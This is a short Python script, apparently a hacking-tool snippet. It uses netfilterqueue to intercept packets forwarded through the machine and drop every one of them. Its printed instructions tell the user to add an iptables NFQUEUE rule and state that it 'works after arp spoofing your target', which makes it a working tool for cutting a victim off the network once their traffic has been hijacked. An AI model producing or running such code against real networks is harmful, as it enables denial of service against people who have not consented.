#!/usr/bin/env python 
import netfilterqueue 
print(" run:- iptables -I FORWARD -j NFQUEUE --queue-num 0 ")
print("works after arp spoofing your target")

def process_packet(packet):
	print(packet)
	packet.drop()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
